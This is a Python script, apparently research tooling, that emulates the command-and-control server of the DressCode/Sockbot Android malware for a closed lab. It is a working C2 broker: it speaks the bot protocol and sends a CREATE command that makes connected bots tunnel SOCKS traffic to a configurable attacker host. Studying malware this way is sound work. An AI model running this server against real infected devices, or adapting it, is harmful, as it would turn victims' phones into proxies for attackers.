#!/usr/bin/env python3
"""Minimal DressCode/Sockbot C2 broker emulator for a closed lab.

It speaks the byte-level C2 protocol observed in com.p051zz.p052cc.Client:
HELLO/PING/PONG/WAIT/SLEEP/CREATE lines delimited by LF (0x0a).
"""

from __future__ import annotations

import argparse
import socket
import threading
import time
from datetime import datetime


def ts() -> str:
    return datetime.now().strftime("%H:%M:%S.%f")[:-3]


def log(msg: str) -> None:
    print(f"[{ts()}] [C2] {msg}", flush=True)


def recv_line(conn: socket.socket, timeout: float) -> bytes | None:
    conn.settimeout(timeout)
    data = bytearray()
    try:
        while True:
            b = conn.recv(1)
            if not b:
                return bytes(data) if data else None
            data += b
            if b == b"\n":
                return bytes(data)
    except socket.timeout:
        return None


def send_line(conn: socket.socket, line: str) -> None:
    payload = line.encode("ascii") + b"\n"
    conn.sendall(payload)
    log(f"TX {payload!r}")


def handle_bot(conn: socket.socket, peer: tuple[str, int], args: argparse.Namespace) -> None:
    log(f"bot connected from {peer[0]}:{peer[1]}")
    with conn:
        first = recv_line(conn, args.timeout)
        if first is None:
            log("no initial line received; closing")
            return
        log(f"RX {first!r}")

        send_line(conn, "HELLO")
        echo = recv_line(conn, args.timeout)
        if echo is not None:
            log(f"RX {echo!r}")

        if args.ping:
            send_line(conn, "PING")
            pong = recv_line(conn, args.timeout)
            if pong is not None:
                log(f"RX {pong!r}")

        if args.wait:
            send_line(conn, "WAIT")
            log("WAIT has no response; bot sleeps about 2 seconds")
            time.sleep(2.2)

        if args.sleep:
            send_line(conn, "SLEEP")
            log("SLEEP has no response; bot sleeps about 120 seconds")
            time.sleep(120.5)

        create = f"CREATE,{args.attacker_host},{args.attacker_port}"
        send_line(conn, create)
        log("CREATE sent; SOCKS traffic should move to attacker listener")

        while args.keep_open:
            time.sleep(args.keepalive_interval)
            try:
                send_line(conn, "PING")
                pong = recv_line(conn, args.timeout)
                if pong is None:
                    log("bot did not answer keepalive; closing")
                    return
                log(f"RX {pong!r}")
            except OSError as exc:
                log(f"keepalive failed: {exc}")
                return


def main() -> None:
    parser = argparse.ArgumentParser(description="DressCode C2 broker emulator")
    parser.add_argument("--bind", default="0.0.0.0", help="local address to bind")
    parser.add_argument("--port", type=int, default=9001, help="C2 TCP port")
    parser.add_argument("--attacker-host", default="10.0.2.2", help="host sent in CREATE")
    parser.add_argument("--attacker-port", type=int, default=9002, help="port sent in CREATE")
    parser.add_argument("--timeout", type=float, default=15.0, help="read timeout seconds")
    parser.add_argument("--ping", action=argparse.BooleanOptionalAction, default=True)
    parser.add_argument("--wait", action=argparse.BooleanOptionalAction, default=True)
    parser.add_argument("--sleep", action="store_true", help="also send SLEEP before CREATE")
    parser.add_argument("--keep-open", action=argparse.BooleanOptionalAction, default=False)
    parser.add_argument("--keepalive-interval", type=float, default=20.0)
    parser.add_argument("--accept-timeout", type=float, default=0.5, help="listener timeout for Ctrl+C handling")
    args = parser.parse_args()

    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as srv:
        srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        srv.bind((args.bind, args.port))
        srv.listen(20)
        srv.settimeout(args.accept_timeout)
        log(f"listening on {args.bind}:{args.port}")
        log(f"CREATE target will be {args.attacker_host}:{args.attacker_port}")
        try:
            while True:
                try:
                    conn, peer = srv.accept()
                except socket.timeout:
                    continue
                thread = threading.Thread(target=handle_bot, args=(conn, peer, args), daemon=True)
                thread.start()
        except KeyboardInterrupt:
            log("Ctrl+C received; shutting down")


if __name__ == "__main__":
    main()

